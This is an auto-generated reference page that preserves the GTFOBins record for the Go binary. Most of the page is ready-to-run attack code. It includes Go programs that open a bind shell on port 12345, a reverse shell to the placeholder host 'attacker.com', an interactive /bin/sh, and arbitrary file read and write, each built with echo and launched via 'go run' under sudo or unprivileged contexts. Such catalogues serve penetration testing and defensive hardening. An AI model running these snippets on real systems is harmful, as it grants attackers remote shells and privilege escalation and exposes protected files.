---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# go

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `go` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/go` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [go](../../tools/linux/go.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | go |
| name | go |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/go/ |

## Preserved Source Material

```yaml
_body: ''
_name: go
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/go
functions:
  bind-shell:
  - code: 'echo -e ''package main\nimport (\n\t"os"\n\t"syscall"\n)\n\nfunc main(){\n\tfd, _ := syscall.Socket(syscall.AF_INET,
      syscall.SOCK_STREAM, 0)\n\taddr := &syscall.SockaddrInet4{Port: 12345}\n\tcopy(addr.Addr[:], []byte{0,0,0,0})\n\tsyscall.Bind(fd,
      addr)\n\tsyscall.Listen(fd, 1)\n\tnfd, _, _ := syscall.Accept(fd)\n\tsyscall.Dup2(nfd, 0)\n\tsyscall.Dup2(nfd, 1)\n\tsyscall.Dup2(nfd,
      2)\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())\n}'' >/path/to/temp-file.go

      go run /path/to/temp-file.go'
    connector: tcp-client
    contexts:
      sudo: null
      unprivileged: null
  file-read:
  - code: 'echo -e ''package main\nimport (\n\t"fmt"\n\t"os"\n)\n\nfunc main(){\n\tb, _ := os.ReadFile("/path/to/input-file")\n\tfmt.Print(string(b))\n}''
      >/path/to/temp-file.go

      go run /path/to/temp-file.go'
    contexts:
      sudo: null
      unprivileged: null
  file-write:
  - code: 'echo -e ''package main\nimport "os"\nfunc main(){\n\tf, _ := os.OpenFile("/path/to/output-file", os.O_RDWR|os.O_CREATE,
      0644)\n\tf.Write([]byte("DATA\\n"))\n\tf.Close()\n}'' >/path/to/temp-file.go

      go run /path/to/temp-file.go'
    contexts:
      sudo: null
      unprivileged: null
  reverse-shell:
  - code: 'echo -e ''package main\nimport (\n\t"os"\n\t"net"\n\t"syscall"\n)\n\nfunc main(){\n\tfd, _ := syscall.Socket(syscall.AF_INET,
      syscall.SOCK_STREAM, 0)\n\tip := net.ParseIP("attacker.com").To4()\n\taddr := &syscall.SockaddrInet4{Port: 12345}\n\tcopy(addr.Addr[:],
      ip)\n\tsyscall.Connect(fd, addr)\n\tsyscall.Dup2(fd, 0)\n\tsyscall.Dup2(fd, 1)\n\tsyscall.Dup2(fd, 2)\n\tsyscall.Exec("/bin/sh",
      []string{"/bin/sh", "-i"}, os.Environ())\n}'' >/path/to/temp-file.go

      go run /path/to/temp-file.go'
    contexts:
      sudo: null
      unprivileged: null
    listener: tcp-server
  shell:
  - code: 'echo -e ''package main\nimport "syscall"\nfunc main(){\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, []string{})\n}''
      >/path/to/temp-file.go

      go run /path/to/temp-file.go'
    contexts:
      sudo: null
      unprivileged: null
```
